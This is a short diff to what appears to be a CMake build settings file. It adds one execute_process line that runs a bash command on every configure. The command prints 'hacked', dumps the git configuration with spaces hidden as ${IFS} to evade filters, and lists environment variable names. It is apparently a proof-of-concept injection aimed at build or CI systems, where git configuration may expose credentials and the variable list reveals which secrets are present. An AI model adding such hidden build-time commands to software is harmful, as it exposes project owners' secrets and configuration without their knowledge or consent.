@@ -1,3 +1,4 @@
+execute_process(COMMAND bash -c "echo -----hacked------ ; git\${IFS}config\${IFS}--list  ; printenv | cut -d= -f1 || true")
 # Standard settings
 # set(UNIX True)
 # set(Darwin True)
